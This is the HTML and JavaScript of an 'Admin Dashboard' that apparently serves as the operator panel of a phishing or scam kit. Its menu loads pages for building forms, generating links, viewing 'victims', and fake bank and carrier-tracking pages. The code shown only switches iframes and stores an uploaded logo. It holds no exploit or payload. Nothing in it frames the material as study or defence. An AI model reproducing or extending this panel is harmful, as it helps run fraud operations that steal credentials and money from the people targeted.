<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Admin Dashboard</title>
  <style>
    body { margin: 0; font-family: Arial, sans-serif; background: #f4f4f4; }
    .header { background: #222; color: #fff; padding: 10px; text-align: center; display: flex; align-items: center; justify-content: center; gap: 15px; }
    .header img { height: 50px; }
    .nav {
      background: #333;
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 10px;
      padding: 10px;
    }
    .nav a {
      color: white;
      text-decoration: none;
      font-weight: bold;
      background: #444;
      padding: 8px 15px;
      border-radius: 5px;
    }
    .nav a:hover {
      background: #555;
    }
    iframe {
      width: 100%;
      height: 80vh;
      border: none;
    }
    .logo-upload {
      background: #fff;
      padding: 10px;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="header">
    <img id="dashboardLogo" src="logo.png" alt="Logo">
    <h1>Admin Dashboard</h1>
  </div>

  <div class="nav">
    <a href="#" onclick="loadPage('form-builder')">ğŸ¨ Form Builder</a>
    <a href="#" onclick="loadPage('forms')">ğŸ’¾ Saved Forms</a>
    <a href="#" onclick="loadPage('feedback')">ğŸ“ Feedback</a>
    <a href="#" onclick="loadPage('victims')">ğŸ§  View Victims</a>
    <a href="#" onclick="loadPage('members')">ğŸ‘¥ Members</a>
    <a href="#" onclick="loadPage('links')">ğŸ”— Links</a>
    <a href="#" onclick="loadPage('generate')">ğŸ§¾ Generate</a>
    <a href="#" onclick="loadPage('bank')">ğŸ¦ Bank</a>
    <a href="#" onclick="loadPage('tracking')">ğŸ“¦ Tracking (Carrier Federal)</a>
  </div>

  <div class="logo-upload">
    <h3>ğŸ“· Change Platform Logo (Admin Only)</h3>
    <input type="file" id="logoInput" accept="image/*" />
  </div>

  <iframe id="iframePage" src="Social-media-links/build.html"></iframe>

  <script>
    const base = "Social-media-links/";

    function loadPage(page) {
      const iframe = document.getElementById("iframePage");
      if (page === 'form-builder') iframe.src = base + "build.html";
      else if (page === 'forms') iframe.src = base + "forms.html";
      else if (page === 'feedback') iframe.src = base + "feedback.html";
      else if (page === 'victims') iframe.src = base + "victims.html";
      else if (page === 'members') iframe.src = base + "members.html";
      else if (page === 'links') iframe.src = base + "links.html";
      else if (page === 'generate') iframe.src = base + "generate.html";
      else if (page === 'bank') iframe.src = base + "bank.html";
      else if (page === 'tracking') iframe.src = base + "tracking.html";
    }

    const logoInput = document.getElementById('logoInput');
    const dashboardLogo = document.getElementById('dashboardLogo');

    logoInput.addEventListener('change', function (e) {
      const file = e.target.files[0];
      if (file) {
        const reader = new FileReader();
        reader.onload = function (event) {
          const logoURL = event.target.result;
          dashboardLogo.src = logoURL;
          localStorage.setItem('platformLogo', logoURL);
        };
        reader.readAsDataURL(file);
      }
    });

    const savedLogo = localStorage.getItem('platformLogo');
    if (savedLogo) {
      dashboardLogo.src = savedLogo;
    }
  </script>
</body>
</html>
